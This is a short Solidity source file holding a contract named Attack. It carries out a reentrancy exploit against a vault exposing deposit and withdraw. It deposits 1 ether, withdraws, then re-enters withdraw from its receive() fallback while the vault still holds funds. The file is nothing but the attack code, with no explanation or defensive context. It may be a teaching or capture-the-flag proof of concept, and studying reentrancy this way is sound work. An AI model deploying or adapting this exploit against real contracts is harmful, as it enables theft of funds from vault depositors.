// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Attack {
    IVault public vault;
    bool private attacking;
    
    constructor(address _vault) {
        vault = IVault(_vault);
    }
    
    function attack() external payable {
        require(msg.value == 1 ether);
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        if (!attacking && address(vault).balance >= 1 ether) {
            attacking = true;
            vault.withdraw(1 ether);
        }
    }
}
